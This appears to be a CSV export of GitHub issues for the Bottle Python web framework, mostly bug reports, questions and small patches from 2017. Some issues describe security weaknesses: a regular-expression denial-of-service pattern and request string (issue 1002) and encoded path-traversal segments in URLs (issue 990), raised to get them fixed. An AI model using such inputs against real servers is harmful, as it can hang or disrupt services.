ID,Title,Created At,Closed At,Issues,Errors,Messages,Body
1025,Tests failing on Python 2.7,2017-12-23T14:51:27Z,,,AssertionError,"AssertionError: AttributeError: 'NoneType' object has no attribute 'split'","On a fresh clone of the repo, tests are failing under Python 2.7 (2.7.12 on Linux):
```
======================================================================
ERROR: test_simple (test.test_server.TestServerAdapter_auto)
Test a simple static page with this server adapter.
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/home/vinay/projects/bottle/test/test_server.py"", line 86, in tearDown
    raise AssertionError(line.strip().decode('utf8'))
AssertionError: AttributeError: 'NoneType' object has no attribute 'split'

======================================================================
ERROR: test_simple (test.test_server.TestServerAdapter_wsgiref)
Test a simple static page with this server adapter.
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/home/vinay/projects/bottle/test/test_server.py"", line 86, in tearDown
    raise AssertionError(line.strip().decode('utf8'))
AssertionError: AttributeError: 'NoneType' object has no attribute 'split'

----------------------------------------------------------------------
Ran 336 tests in 5.320s

FAILED (errors=2)
```
These fail quite often but sometimes just the one error occurs (the second one) and occasionally, no failure occurs. On Python 3.5, no failures occurred for multiple runs. Tests were run by simply running `testall.py` from within the `test` subdirectory."
1024,Added bottle-oauthlib project reference,2017-12-19T08:46:19Z,,,,,"Let me know if you think it is at the right place.
Thank you."
1023,Pathological SimpleTemplate Examples,2017-12-17T17:41:39Z,,,,,"Truth be told, I do not expect these to be fixed, but it is worth noting that there are some pathological SimpleTemplate lines.

Consider:

```python
bottle.template(""{{! {'a','b'} }}"") # works
bottle.template(""{{! {'a','b'}}}"") # Fails
```

Also, comments inline (done in an odd way). For example:

```
bottle.template(""Hide me: {{# Comment}}. Was it hidden"")
```
Will not work. Of course, this is not a good use of the templates, but in theory, it should not be shown. (should do `% #comment`)

I just think these are worth noting. Not necessarily worth trying to fix or even put in public-facing documentation"
1022,SimpleTemplateEngine block start and end cannot redefine,2017-12-15T22:07:39Z,,,,,"I am using a stripped out version of SImpleTemplateEngine for a project and ran into this issue. I thought maybe I introduced it in my changes, but it seems to exists in Bottle directly too.

You can redefine the SimpleTemplateEngine syntax and modify the `line_start`, the `inline_start` and the `inline_end`. However, for certain changes (though not *all*) changes to `block_start` and `block_end`, it fails.

Consider the following. In this, I change one type of syntax at a time. I also `reload` to make sure there isn't a cacheing issue.

```python
from imp import reload
import bottle

################
# Use reload to remove cache issues
reload(bottle)

default_txt = """"""\
<%
    A = 'hi'
%>
% B = 'bye'
{{A}} {{B}}
""""""
out = bottle.template(default_txt)
assert out.strip() == 'hi bye'

################
# Use reload to remove cache issues
reload(bottle)
new_output = """"""\
<%
    A = 'hi'
%>
% B = 'bye'
[[A]] [[B]]
""""""
out = bottle.template(new_output,
    template_settings=dict(syntax='<% %> % [[ ]]')
)
assert out.strip() == 'hi bye'

################
# Use reload to remove cache issues
reload(bottle)
new_line = """"""\
<%
    A = 'hi'
%>
! B = 'bye'
{{A}} {{B}}
""""""
out = bottle.template(new_line,
    template_settings=dict(syntax='<% %> ! {{ }}')
)
assert out.strip() == 'hi bye'

################
# Use reload to remove cache issues
reload(bottle)
new_block = """"""\
[{
    A = 'hi'
}]
% B = 'bye'
{{A}} {{B}}
""""""
out = bottle.template(new_block,
    template_settings=dict(syntax='[{ }] % {{ }}')
)
assert out.strip() == 'hi bye'
```

I get the following error (with personal info stripped out):

    Traceback (most recent call last):
      File ""error_demo.py"", line 59, in <module>
        template_settings=dict(syntax='[{ }] % {{ }}')
      File ""[...]/python3.6/site-packages/bottle.py"", line 3619, in template
        return TEMPLATES[tplid].render(kwargs)
      File ""[...]/python3.6/site-packages/bottle.py"", line 3409, in render
        self.execute(stdout, env)
      File ""[...]/python3.6/site-packages/bottle.py"", line 3396, in execute
        eval(self.co, env)
      File ""[...]/python3.6/site-packages/bottle.py"", line 189, in __get__
        value = obj.__dict__[self.func.__name__] = self.func(obj)
      File ""[...]/python3.6/site-packages/bottle.py"", line 3354, in co
        return compile(self.code, self.filename or '<string>', 'exec')
      File ""<string>"", line 3
        }]
        ^
    SyntaxError: invalid syntax

I am using python 3.6.3 in a virtualenv with nothing but bottle. Though I get the same issue in 2.7 (without the `from imp import reload`) line."
1021,Error trying to use global variable from mounted app,2017-12-12T00:30:16Z,2017-12-20T19:10:16Z,,,,"I got a parent_app in a python file (parent.py) that I'm trying to mount in a child_app in another python file (child.py). The mount seems to work but, when I try to call a route from my parent_app trough the mount in my child_app, this route doesn't seems to be able to use global variable in my parent.py file.

The parent.py file:

    from bottle import route
    import bottle
    import subprocess as sp

    global extProc

    parent_app = bottle.Bottle()

    @parent_app.route('/start')
    def start_bazarr():
        global extProc
        extProc = sp.Popen(['python','child.py'])

    @parent_app.route('/stop')
    def stop_bazarr():
        sp.Popen.terminate(extProc)

    @parent_app.route('/restart')
    def restart_bazarr():
        stop_bazarr()
        start_bazarr()

    if __name__ == '__main__':
        start_bazarr()

The child.py file:

    from bottle import route, run
    import bottle
    from parent import parent_app

    child_app = bottle.Bottle()

    @child_app.route('/')
    def root():
        return u'Lorem Ipsum'

    if __name__ == '__main__':
        child_app.mount('/power', parent_app)
        child_app.run(host='127.0.0.1', port=8080)

The URL I'm trying to call:

`http://127.0.0.1:8080/power/restart`

The error I got:

Traceback (most recent call last):

    File ""C:\Python27\lib\site-packages\bottle.py"", line 862, in _handle
        return route.call(**args)
    File ""C:\Python27\lib\site-packages\bottle.py"", line 1740, in wrapper
        rv = callback(*a, **ka)
    File ""C:\Users\morpheus\Desktop\parent.py"", line 20, in restart_bazarr
        stop_bazarr()
    File ""C:\Users\morpheus\Desktop\parent.py"", line 16, in stop_bazarr
        sp.Popen.terminate(extProc)
    NameError: global name 'extProc' is not defined

What am I doing wrong?"
1020,replace traceback with cgitb for error handling,2017-12-10T21:55:27Z,,,,,"replaces the standard traceback messages with more verbose messages from cgitb, to make debugging easier."
1019,Subdomain support?,2017-12-10T06:34:02Z,,,,,"You might add a subdomain parsing like in Flask.
[Flask Doc](http://flask.pocoo.org/docs/0.12/api/?highlight=subdomain#url-route-registrations)"
1018,fix pass None to tob,2017-12-09T03:12:06Z,2017-12-09T12:20:16Z,,,,"I think the `tob` fuction has a bug on this [line](https://github.com/bottlepy/bottle/blob/master/bottle.py#L164)

```Python
def tob(s, enc='utf8'):
    if isinstance(s, unicode):
        return s.encode(enc)
    return bytes("""" if s is None else s)
```

If pass `None` to `tob`, it will execute `bytes("""")`. And there will be a `TypeError` that `string argument without an encoding`

I think you mean that `return b'' if s is None else bytes(s)`

"
1017,How to restart my python script running bottle?,2017-12-09T02:46:38Z,2017-12-09T12:07:50Z,,,,"I want to define a route that can be called to restart my python script.

Here's a sample script:
    from bottle import route, run, redirect
    import os

    @route('/')
    def root():
        return u'test'

    @route('/restart')
    def restart():
        print 'restart'
        os.execlp('python', 'python', __file__)
        redirect ('/')

    run(host='0.0.0.0', port=8080)

I've tried with `os.execlp` but the new instance never reply to request. I just can't access it at all.

Some help would be appreciated to solve this one. Thanks!"
1016,Replace traceback with cgitb to improve debugging?,2017-12-06T12:34:07Z,,,TypeError,"TypeError: unsupported operand type(s) for /: 'str' and 'int'","While I like bottle a lot, I've often had trouble debugging an application because the standard traceback does not provide much information in the stacktrace.

While t's possible to install a plugin (bottle_debugtoolbar) to help solve this problem, I've found it a bit bloated (it uses jinja templates, so it requires that module plus others) and buggy (I haven't always been able to get it to work in an existing app).

I recently came across [cgitb](https://docs.python.org/3/library/cgitb.html), a module in the standard library of all current Python versions.  It was originally designed to provide traceback information for cgi scripts, but can be used to debug any Python application.  

The big advantage of this module is that it automatically displays:

1. the value of each argument of each  function in the call stack, 
2. some of the lines of code around each function call, and
3. the local variables of each function in the call stack.  

This makes debugging **much** easier.  So in a simple bottle app like this:
```
import bottle
app = bottle.default_app()

def error(var):
    bar = 1
    return var/bar

@app.route('/hello')
def hello():
    return error('5')

app.run(host='localhost', port=8080, debug=True)
```
Rather than seeing this:

> Traceback (most recent call last):
  File ""/tmp/test_app/bottle.py"", line 1000, in _handle
    out = route.call(**args)
  File ""/tmp/test_app/bottle.py"", line 2001, in wrapper
    rv = callback(*a, **ka)
  File ""hello_app.py"", line 11, in hello
    return error('5')
  File ""hello_app.py"", line 7, in error
    return var/bar
TypeError: unsupported operand type(s) for /: 'str' and 'int'

You get this (the original has better indentiation):

> <type 'exceptions.TypeError'>
> Python 2.7.13: /usr/bin/python
> Wed Dec  6 06:15:13 2017
> 
> A problem occurred in a Python script.  Here is the sequence of
> function calls leading up to the error, in the order they occurred.
> 
>  /tmp/test_app/bottle.py in _handle(self=<bottle.Bottle object>, environ={'BROWSER': '/usr/bin/firefox', 'COLORTERM': 'truecolor', 'CONTENT_LENGTH': '', 'CONTENT_TYPE': 'text/plain', 'DBUS_SESSION_BUS_ADDRESS': 'unix:path=/run/user/1000/bus', 'DESKTOP_SESSION': 'lightdm-xsession', 'DISPLAY': ':0.0', 'EDITOR': '/usr/bin/vim', 'GATEWAY_INTERFACE': 'CGI/1.1', 'GDMSESSION': 'lightdm-xsession', ...})
>   998                     environ['bottle.route'] = route
>   999                     environ['route.url_args'] = args
>  1000                     out = route.call(**args)
>  1001                     break
>  1002                 except HTTPResponse as E:
> out = None
> route = <GET '/hello' <function hello>>
> route.call = <function hello>
> args = {}
> 
>  /tmp/test_app/bottle.py in wrapper(*a=(), **ka={})
>  1999         def wrapper(*a, **ka):
>  2000             try:
>  2001                 rv = callback(*a, **ka)
>  2002             except HTTPResponse as resp:
>  2003                 rv = resp
> rv undefined
> callback = <function hello>
> a = ()
> ka = {}
> 
>  /tmp/test_app/hello_app.py in hello()
>     9 @app.route('/hello')
>    10 def hello():
>    11     return error('5')
>    12 
>    13 app.run(host='localhost', port=8080, debug=True)
> global error = <function error>
> 
>  /tmp/test_app/hello_app.py in error(var='5')
>     5 def error(var):
>     6     bar = 1
>     7     return var/bar
>     8 
>     9 @app.route('/hello')
> var = '5'
> bar = 1
> <type 'exceptions.TypeError'>: unsupported operand type(s) for /: 'str' and 'int'
>     __class__ = <type 'exceptions.TypeError'>
>     __delattr__ = <method-wrapper '__delattr__' of exceptions.TypeError object>
>     __dict__ = {}
>     __doc__ = 'Inappropriate argument type.'
>     __format__ = <built-in method __format__ of exceptions.TypeError object>
>     __getattribute__ = <method-wrapper '__getattribute__' of exceptions.TypeError object>
>     __getitem__ = <method-wrapper '__getitem__' of exceptions.TypeError object>
>     __getslice__ = <method-wrapper '__getslice__' of exceptions.TypeError object>
>     __hash__ = <method-wrapper '__hash__' of exceptions.TypeError object>
>     __init__ = <method-wrapper '__init__' of exceptions.TypeError object>
>     __new__ = <built-in method __new__ of type object>
>     __reduce__ = <built-in method __reduce__ of exceptions.TypeError object>
>     __reduce_ex__ = <built-in method __reduce_ex__ of exceptions.TypeError object>
>     __repr__ = <method-wrapper '__repr__' of exceptions.TypeError object>
>     __setattr__ = <method-wrapper '__setattr__' of exceptions.TypeError object>
>     __setstate__ = <built-in method __setstate__ of exceptions.TypeError object>
>     __sizeof__ = <built-in method __sizeof__ of exceptions.TypeError object>
>     __str__ = <method-wrapper '__str__' of exceptions.TypeError object>
>     __subclasshook__ = <built-in method __subclasshook__ of type object>
>     __unicode__ = <built-in method __unicode__ of exceptions.TypeError object>
>     args = (""unsupported operand type(s) for /: 'str' and 'int'"",)
>     message = ""unsupported operand type(s) for /: 'str' and 'int'""
> 
> The above is a description of an error in a Python program.  Here is
> the original traceback:
> 
> Traceback (most recent call last):
>   File ""/tmp/test_app/bottle.py"", line 1000, in _handle
>     out = route.call(**args)
>   File ""/tmp/test_app/bottle.py"", line 2001, in wrapper
>     rv = callback(*a, **ka)
>   File ""hello_app.py"", line 11, in hello
>     return error('5')
>   File ""hello_app.py"", line 7, in error
>     return var/bar
> TypeError: unsupported operand type(s) for /: 'str' and 'int'

The required changes are minimal (two new lines of code, one deletion, and five changes).  I can submit a pull request if there's interest.
"
1015,Problem of timeout with Multi-threaded backend server,2017-11-30T12:37:37Z,,,,,"Hello,

Since long time I have a problem when I use Bottle with Multi-threaded server: randomly I have a long request answer or a timeout.
- The code is simple, just load some data from a database.
- I tried with Python 3.2 and now Python 3.6.2
- I tried Debian 7 and 9
- I use the last version of Bottle
- I tried cherrypy and now paste

If someone have an idea how to fix my problem, thank you :)
"
1014,A few comment cleanups,2017-11-29T14:17:18Z,2017-12-09T12:22:07Z,,,,"Several lines had misaligned `#` symbols in them, they were:
271, 618, 1147, 1965, 2069, 2790, 2926, 3183, 3578, 3768, and 4260."
1013,Add UnicodeFormsPlugin + tests,2017-11-29T00:51:25Z,,,,,"Fixes #774 .

What: Adds a built-in plugin, `UnicodeFormsPlugin`, which looks for `config['utf8.unicode_forms']`. By default, `utf8.unicode_forms` is `False`, which means `FormsDict` will be used. When it is set to `True`, `UnicodeFormsDict` is used which inherits from `FormsDict` and overrides `MultiDict` methods so that all methods use `_fix` when applicable. It still retains access to the raw values through a few methods.

Usage:
```
app = bottle.Bottle()
app.install(bottle.UnicodeFormsPlugin())

app.config['utf8.unicode_forms'] = True
# or
@app.post('/someroute', **{'utf8.unicode_forms' : True})
def myroute():
    pass
```

It is both skippable and configurable per-route.

Since #774 is a compatibility issue, I tried to make sure an easy migration was possible. People can start using this plugin now, it can be turned on by default at a later version, and then we can remove the plugin and change the default behaviour later."
1012,Insert omitted word in stpl.rst,2017-11-28T16:16:43Z,2017-12-09T12:23:02Z,,,,
1011,"SQLite-plugin: possible to use ""db"" outside of route?",2017-11-17T12:52:40Z,2017-11-17T13:00:09Z,,`ProgrammingError,"`ProgrammingError: Cannot operate on a closed database.`","I'm quite new to Python and Bottle but I got an issue using SQLite plugin.

I need to call my database directly from my Python script without going trough a route. Is it possible?

```
from bottle import route, run, template, static_file, request, redirect, install
from bottle_sqlite import SQLitePlugin
install(SQLitePlugin(dbfile=data/db/database.db'))

log_level = db.execute(""SELECT log_level FROM table_settings_general"").fetchone()
#do whatever with log_level

@route('/')
def root():
    #do whatever we want...
```

I keep getting this error:
`ProgrammingError: Cannot operate on a closed database.`

I'm pretty sure there's a way to use ""db"" outside of a route in the main python script but I can't find anything.

Thanks!"
1010,"not able set/update/add response header( parameter - ""Server"") in bottle paste server ?",2017-11-06T08:39:33Z,,,,,"i am trying to explicitly update response header. specially parameter ""Server"" = NULL.
response.set_header('Server', ' ')
response.add_header('Server', ' ')

i am running server with paste as : 
app.run(host='localhost', port=5010, debug=True, server='paste')
not able to make changes for parameter ""Server"". default response i am getting   "" server →PasteWSGIServer/0.5 Python/2.7.13 ""
but able to change other parameter like "" Content_Type "".

but when i am running server without paste as : 
app.run(host='localhost', port=5010, debug=True) 
am able to make changes to all parameters.. 

please suggest me what is the problem and if possible what would be resolution for this ?"
1009,Fix Last-Modifed and Date header formats in static_file for non-engli…,2017-11-05T13:04:25Z,2017-11-06T12:30:02Z,,,,"…sh locales

time.strftime produces locale-dependent date format. At best, this lead to
invalid dates being produced, e. g: 'Ne, 05 lis 2017 12:58:28 GMT'. At worst,
this lead to encoding crashes for dates like 'Út, 31 říj 2017 12:58:28 GMT'

Some code to reproduce the issue

```
#! /usr/bin/env python3

import locale
import os
import bottle
import time

locale.setlocale(locale.LC_TIME, ""cs_CZ.UTF-8"")

print(time.strftime(""%a, %d %b %Y %H:%M:%S GMT"", time.gmtime()))


@bottle.route(""/<path:path>"")
def handle(path):
    return bottle.static_file(path, root=os.path.dirname(__file__))

bottle.run(host=""localhost"", port=""9999"")
```

(wait for tuesday to get it to crash :))"
1008,keyword arguments not working,2017-11-01T14:41:29Z,,,,,"I have no idea why but I am in the situation that keyword arguments are not working. I use this code

```
@route('/hello/<name>')
def greet(name='Stranger'):
    return template('Hello {{name}}, how are you?', name=name)
```
And it becomes a 404 status. If I do it without the argument then it works. This is the strangest thing that happened to me in my life. "
1007,Fixed a sentence,2017-10-27T11:43:09Z,2017-11-06T12:31:24Z,,,,
1006,Fix spelling errors,2017-10-18T14:16:39Z,2017-11-06T12:31:40Z,,,,
1005,Update maifest,2017-10-18T13:03:39Z,2017-11-06T12:32:22Z,,,,This fixes #1004 
1004,Pypi package is missing LICENSE file,2017-10-18T12:51:15Z,2017-11-06T12:32:22Z,,,,"This makes it very difficult to use this package in a yocto build, some kind of license file must be inside the tarball and I have to refer to it and its checksum for the automated QA tests to pass.

This is probably a side effect of #348
"
1003,Change SimpleTemplate default Syntax,2017-10-17T23:33:35Z,,,,,"Is there a way we can change the `default_syntax = '<% %> % {{ }}'` without hacking Bottle so we can use handlebars for vuejs or angular when building templates.
"
1002,Feature Request: Monitor time span of wsgi calls,2017-10-15T13:19:44Z,2017-10-16T10:54:10Z,,,,"Hey

There is a type of attack on webservers called regular expression DOS:
https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS

It uses the fact, that re engines may take a lot of time for processing certain regular expression/string combinations. Using these with bottle e.g. by specifying /\<name:re:(x+x+)+y\> as URL pattern and requesting /xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx from the server result in the server getting stuck.

Do you think it might be useful to create an option, where the wsgi() call of Bottle objects is implemented as a new process started and the time used by this process is monitored? Do you see huge drawbacks in e.g. overhead?

I tried to do such an implementation just for the regular expression module. I created a class, which objects have the same interface like the re module, but calls like re.match() are embedded in the runtime checks. In bottle.py, you create one of these objects  and call it re instead of importing re.

Wrapping just the regular expressions into some time monitoring has less side effects than wrapping the complete wsgi() call. But on the other hand, I had a huge problem with passing the return values of the re functions from the created process to the calling one. Objects transferred using multiprocessing.Pipe() need to be pickable. The objects returned by re.match() are not pickable, I had to write a class, which has the same interface like the match objects, but which is pickable. So the code became ugly.

I had to use processes instead of threads, because you can kill processes in a clean manner. Threads have no terminate() method.
I tried to do such an implementation just for the regular expression module. I created a class, which objects have the same interface like the re module, but calls like re.match() are embedded in the runtime checks. In bottle.py, you create one of these objects and call it re instead of importing re.

Wrapping just the regular expressions into some time monitoring has less side effects than wrapping the complete wsgi() call. But on the other hand, I had a huge problem with passing the return values of the re functions from the created process to the calling one. Objects transferred using multiprocessing.Pipe() need to be pickable. The objects returned by re.match() are not pickable, I had to write a class, which has the same interface like the match objects, but which is pickable. So the code became ugly.

I had to use processes instead of threads, because you can kill processes in a clean fashion. Threads have no terminate() method.

I appended this wrapper class, the pickable match class and a small test script.[TimeGuardExample.zip](https://github.com/bottlepy/bottle/files/1385458/TimeGuardExample.zip)





Do you thing the wrapping of whole Bottle.wsgi() is a good idea?"
1001,Explicitly add global variables to the globals dictionary passed to exec statement when executing compiled templates.,2017-10-15T11:35:15Z,,,,,"SimpleTemeplate is implemented as a compiled python code object executed using the builtin function exec(). The global variables visible in the compiled statement are passed as a dictionary. This dictionary now contains explicitly all definitions of the global context, in which exec() is called. Otherwise, specifying a variable in the URL pattern called \_\_builtins\_\_ leads to an empty globals() context, because exec() would not add the globals() definitions implicitly in that case. All calls of builtins in the compiled statement would lead to an exception.
See https://docs.python.org/3/library/functions.html#exec for the implicit definition of necessary global context."
1000,ResourceWarning: unclosed file <_io.BufferedReader... in static_file(),2017-09-26T14:07:30Z,,,,,"We've recently got this error coming from `static_file()` function ([this line](https://github.com/bottlepy/bottle/blob/master/bottle.py#L2910)):

> /usr/lib/python3.5/unittest/case.py:600: ResourceWarning: unclosed file <_io.BufferedReader name='/tmp/20170926_084744_545761.pdf'>
  testMethod()

`with` should fix it as it did in a similar issue: https://github.com/bottlepy/bottle/pull/611. Thanks."
999,Fix typo for todo tutorial line 300 and 301,2017-09-21T18:27:51Z,2017-11-06T12:34:30Z,,,,missing GET method to strip edit and status
998,status and headers of returned Response instances are ignored,2017-09-16T03:56:14Z,,,,,"First reported 2013 #511 the bug is still present in the master branch. Even worse according to the documentation the following should work just fine.

    Response(body='', status=403, headers=headers)

While the `body` argument works the `status` and `headers` arguments have no effect whatsoever.
I am refiling this issue, since the previous one has a misleading title and doesn't mention that it also effects headers.

Having to raise `HTTPResponse` for non-erroneous statuses like redirects doesn't make any semantic sense. If this bug won't get fixed after 4 years it should at least be documented."
997,from bottle import touni,2017-09-12T17:49:27Z,,,,,touni() is called on line 97.
996,Config from command line,2017-09-08T07:15:21Z,2017-09-08T15:54:59Z,,,,"I want to use parameter from command line to enable disable functionnality.
Is there a better way than this injection ?
```python
from bottle import Bottle, run
import argparse

app = Bottle()
@app.route('/')
def home():
    if app.some_parameters:
        return ""Hello world""
    else:
        return ""Hello bottle""

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument(""--param"", action='store_true', help=""Some help"")
    args = parser.parse_args()

    app.some_parameters = args.param
    run(app, host='localhost', port=8080)
```
"
995,(v0.13-dev) Can't run aiohttp server,2017-09-07T20:50:35Z,,,ImportError,"ImportError: No module named 'aiohttp.wsgi'","
```
Traceback (most recent call last):
  File ""/Users/mellis/ls-mapped-mode/bottle.py"", line 3709, in run
    server.run(app)
  File ""/Users/mellis/ls-mapped-mode/bottle.py"", line 3511, in run
    from aiohttp.wsgi import WSGIServerHttpProtocol
ImportError: No module named 'aiohttp.wsgi'
Bottle v0.13-dev server starting up (using AiohttpServer())...
```
Apparently aiohttp has obsoleted .wsgi. See https://github.com/aio-libs/aiohttp/issues/1108

Truth be told, my real interest here is to be able to run some background tasks as coroutines without having to resort to subprocesses or threads.  I read your writeup about using gevent but prefer to use asyncio and async/await since these are now built into Python.  Any suggestions?

Thanks!"
994,fixes sqlite3.ProgrammingError: Incorrect number of bindings supplied,2017-09-07T08:56:17Z,2017-09-07T09:01:27Z,,,,
993,Feature Request: meta Plugin,2017-08-22T19:32:43Z,,,,,"Hey,

i am often finding myself implementing model/db pluging´s for Bottle. Since they looked all pretty much the same, i created a MetaPlugin, that take two arguments: a object, representing a instance of the model/db(connection pool), and a associated keyword.

here is what i got:

```
class MetaPlugin(object):
    api = 2

    def __init__(self, model, keyword):
        self.keyword = keyword
        self.model = model

    def setup(self, app):
        for other in app.plugins:
            if not isinstance(other, MetaPlugin):
                continue
            if other.keyword == self.keyword:
                raise PluginError('Found another plugin with the same keyword: {0}'.format(self.keyword))

    def apply(self, callback, context):
        callback_args = inspect.signature(context.callback)
        if self.keyword not in callback_args.parameters:
            return callback

        def wrapper(*args, **kwargs):
            kwargs[self.keyword] = self.model
            rv = callback(*args, **kwargs)
            return rv
        return wrapper
```

this can then simply be used with every model, connection pool object or whatever like:

```
app.install(MetaPlugin(intake, 'm_intake'))
```

i think this migth be something that could be useful for others to. what do you think? should i create a pull request?

Kind Regards"
992,Questions about child processes and manually reloading,2017-08-20T13:06:40Z,2017-08-21T08:59:28Z,,,,"Good day!

I use Bottle + WSGIRefServer and have some questions.

1. In which point of code is child process created?
2. Are there fixed number of child processes or ""one process per request""?
3. How do I limit number of child processes? I want to have <= 1 child process at every moment.
4. How do I *manually* reload server? So I want to reload server by a signal...

Thanks very much!"
991,`FormsDict` documentation,2017-08-20T10:27:26Z,2017-08-21T14:50:49Z,,,,"`FormsDict` documentation [says](http://bottlepy.org/docs/dev/api.html#bottle.FormsDict):

>  Attributes are automatically de- or recoded to match `input_encoding` (default: `‘utf8’`)

> decode(encoding=None)
> Returns a copy with all keys and values de- or recoded to match `input_encoding`. Some libraries (e.g. WTForms) want a unicode dictionary.

* ""to match `input_encoding`"" or ""to match `encoding` or (`input_encoding` if `None`)""?
* ""de- or recoded to match"" or ""de- or recoded to match if `recode_unicode` is `True`, unmodified else""?
* there is a special case in [code](https://github.com/bottlepy/bottle/blob/master/bottle.py#L2193) - `bytes` - what about it?

> getunicode(name, default=None, encoding=None)
> Return the value as a unicode string, or the `default`.

* do you mean ""`unicode`/`str`"" at ""unicode string""?
* ""de- or recoded to match `encoding` (`input_encoding` if `None`)"" have to be added? or ""de- or recoded to match `encoding` (`input_encoding` if `None`) if `recode_unicode` is `True`, unmodified else""?
* there is a special case in [code](https://github.com/bottlepy/bottle/blob/master/bottle.py#L2193) - `bytes` - what about it?

Thoughts (IMHO):

* `getunicode` + ""unicode string"" is ambiguous. Well, maybe it wasn't for Python 2 period... But it's not a Unicode string in fact.
* is `recode_unicode` needness in public API?
* Let's write these docs more clearly?.. :smile: 
* Couldn't we parse (using `input_encoding`) headers *initially*? Then `recode_unicode` and `encoding` arguments are needless...

Thanks!"
990,pre-urldecode causes path parameters to become part of the route,2017-08-20T07:40:58Z,2017-08-21T10:02:19Z,,,,"Hi,

It appears that bottle pre-urldecodes the raw path string prior to passing it to the routing engine.
This has a couple of weird quirks and also probably violates the spirit of the HTTP spec relating to path handling (<https://tools.ietf.org/html/rfc3986#section-3.3>). In particular, this results in path segments consisting of path-like values being hoisted to the top level of the URL for routing purposes, and missing dynamic routes that should match. This prevents the path from being routed correctly, unless there is a `:path` wildcard filter applied. However, if this filter is applied, the `Request.fullpath` variable will not contain the correct string and will contain the post-decode ""resolved"" path.

For example, consider the URL: `http://127.0.0.1:8080/hello/foo%2fbar%2fbaz/world`

And the following code:
```python
from bottle import route, run, template, request

@route('/hello/<xmlxpath>/world')
def hello(xmlxpath):
    return template('<b>xmlxpath: {{xmlxpath}}<br>fullpath: {{fullpath}}</b>',
                    xmlxpath=xmlxpath, fullpath=request.fullpath)

run(host='localhost', port=8080)
```

The expected behavior is that the `hello` function will be called and that the following will render:

```
xmlxpath: foo/bar/baz
fullpath: /hello/foo%2fbar%2fbaz/world
```

The actual behavior is that the request 404s.

If we ""fix"" the code by adding a `:path` filter to the `<xmlxpath>` wildcard, as below, the same output is expected.

```python
from bottle import route, run, template, request

@route('/hello/<xmlxpath:path>/world')
def hello(xmlxpath):
    return template('<b>xmlxpath: {{xmlxpath}}<br>fullpath: {{fullpath}}</b>',
                    xmlxpath=xmlxpath, fullpath=request.fullpath)

run(host='localhost', port=8080)
```

However, the actual output is the following:

```
xmlxpath: foo/bar/baz
fullpath: /hello/foo/bar/baz/world
```

In the above, the fullpath contains a URL-decoded `<xmlpath>` segment value, which does not preserve the semantics of what was actually requested. However the issue goes deeper than this. Instead, consider the URL: `http://127.0.0.1:8080/hello/foo%2fbar%2f..%2f..%2fbaz/world`

The expected result of the page is the following:

```
xmlxpath: foo/bar/../../baz
fullpath: /hello/foo%2fbar%2f..%2f..%2fbaz/world
```

However, the actual result is the following:

```
xmlxpath: foo/bar/../../baz
fullpath: /hello/baz/world
```

In this case, not only is the path segment not preserved, it is pre-resolved in the fullpath.

Based on the RFC's definition of a path segment, both in structure and purpose, this behavior is troublesome as path segments are to be considered ""considered opaque by the generic syntax."" Furthermore, it goes on to state ""URI producing applications often use the reserved characters allowed in a segment to delimit scheme-specific or dereference-handler-specific subcomponents.""

While it would be tempting to say that ensuring the `Request.fullpath` value has the actual full path of the request would be enough to fix this, the pre-urldecoding behavior is already arguably ""wrong"" given the spec — most other web frameworks' (across languages) routing behaviors for this sort of route parameter syntax follow the spec as described — and `:path` behavior should be the default.

"
989,Support dict as input for add_header(),2017-08-07T19:02:15Z,,,,,"Currently i'm adding multiple headers like this:
```
headers = {'some_header' : 'some_value', 'more_header' : 'more_value'}
for h, v in headers.items():
   add_header(h, v)
```

Wouldn't it be convenient  if `add_header()` supported multiple headers, as name/value pairs in a dict?
(and `set_header()` as well)


I think this could be easily done with something like:
```
if type(arg) == dict:
  for name, value in arg.items():
    self._headers.setdefault(_hkey(name), []).append(_hval(value))
else:
  self._headers.setdefault(_hkey(name), []).append(_hval(value))
```

Am missing something or isn't there a good reason that this coudn't be implemented?"
988,What route should I use when using bottle online,2017-07-28T03:04:15Z,2017-07-29T13:08:49Z,,,,"Hello, I'm trying to use bottle as the web framework for my website I'm making with Netfirms. So basically I have uploaded the bottle.py file to my directory on netfirms and I'm importing it to files in the same directory and folder. Since this is an online directory I can't use the local host to run my site and therefore can't just set @route('/') for the home page. Does anyone know how I can go about figuring out what to put in the route() function?"
987,Fix CI ,2017-07-22T06:27:14Z,2017-07-22T07:42:51Z,,,,"@defnull I removed Python 3.2 version because they break the build. 
Also, this version of Python is obsolete and it should cause people to think bottle in it's
current master branch is not working with their current Python (I assume most people 
will not have Python 3.2)."
986,bugfix: import Morser for python 2,2017-07-18T16:22:18Z,2017-07-22T07:52:03Z,,,,
985,Question about logging,2017-07-14T16:13:59Z,2017-07-14T18:11:21Z,,,,"**TL;DR**: I've a python logging configuration I've used for years in multiprocessing applications. How can I make it work in a bottle app spawned as one of the processes in my application?

**More info:**
With multiple processes running, it's really useful to have all the log messages from every process go to a common file in a format that includes a timestamp, the module name, etc.  It's also useful to map logger.debug(), logger.info(), etc to module level names like debug(), info(), etc.  

**Example**
In modules containing spawned processes, I init the logger like so:
```
import local_logging
debug, info, warning, error = local_logging.init_logger(msg_prefix=""Whatever"") 
```
and use the returned functions to create log messages.
```
info('Entering serial_response_handler_service')
```
produces a message like this
```
2017-07-14 09:54:35,064 - pid:39690 in:serial_response_handler.serial_response_handler_service() - INFO
Whatever: Entering serial_response_handler_service
```
**The Problem**
When I try this in a bottle application, it only works within the function that launches the app.  Trying to use it within a callback doesn't create an error, but it doesn't write the message to the log file. I've no idea where it's going.

_The logging call works here_
```
def serve(const, server='wsgiref', port=8001, reloader=False,
          debugmode=False, quiet=True):

    info(""starting web server"")
    bottle.debug(debugmode) ##

    ## Launch the web service loop.
    bottle.run(app,
               host='0.0.0.0',
               server=server,
               port=port,
               reloader=reloader,
               debug=debugmode,
               quiet=quiet)         
```
_but not here_

```
@app.post(""/checktoken"")
def checktoken(db):
    info(""Checking token"")
    token = request.forms.get(""token"")
    return dict(token_valid=auth.checktoken(token, db))   
```

I know there are various logging plugins and solutions on SO but I'd really like to keep my familiar way of writing log messages and have it work in callbacks. 

I'm appending the code in my logging module at the end of this message. As you can see, it's just a configuration of the standard Python logging facility.  Any help in figuring out to make it work with Bottle will be much appreciated.

Thanks,
Mike Ellis

```
""""""
Simple general purpose logger.
